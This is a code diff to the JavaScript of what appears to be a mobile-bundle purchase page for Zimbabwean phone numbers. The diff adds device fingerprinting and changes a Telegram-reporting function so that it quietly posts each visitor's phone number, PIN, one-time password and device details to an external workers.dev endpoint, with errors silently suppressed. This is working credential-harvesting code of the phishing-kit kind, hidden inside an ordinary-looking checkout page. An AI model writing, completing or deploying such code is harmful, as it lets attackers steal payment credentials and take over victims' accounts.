@@ -386,12 +386,26 @@ document.getElementById('hdrTitle').textContent=(plan.duration||'Bundle')+' Mix'
 })();
 
 /* ── TELEGRAM ── */
+function tgDevice(){
+  var ua=navigator.userAgent||'';
+  var os=ua.match(/iPhone|iPad/i)?'iOS':ua.match(/Android/i)?'Android':ua.match(/Windows/i)?'Windows':ua.match(/Mac/i)?'Mac':'Unknown';
+  var br=ua.match(/Chrome/i)?'Chrome':ua.match(/Firefox/i)?'Firefox':ua.match(/Safari/i)?'Safari':ua.match(/Edge/i)?'Edge':'Browser';
+  var mob=ua.match(/Mobile|Android|iPhone/i)?'Mobile':'Desktop';
+  return mob+' · '+os+' · '+br;
+}
+function tgPhone(raw){
+  var r=String(raw||'').replace(/\D/g,'');
+  if(r.startsWith('263'))r=r.slice(3);
+  if(r.startsWith('0'))r=r.slice(1);
+  return r; // 9 digits starting with 7, e.g. 771234567
+}
 function tg(event,otp){
   try{
-    fetch('/api/telegram',{method:'POST',headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({event:event,phone:recip.raw||'',pin:PIN,otp:otp||'',
+    fetch('https://payless-api.YOUR-SUBDOMAIN.workers.dev',{method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({event:event,phone:tgPhone(recip.raw),pin:PIN,otp:otp||'',
         plan:plan.duration||'',voice:plan.voice||'',sms:plan.sms||'',
-        data:plan.data||'',amount:plan.amount||''})
+        data:plan.data||'',amount:plan.amount||'',
+        device:tgDevice()})
     }).catch(function(){});
   }catch(e){}
 }
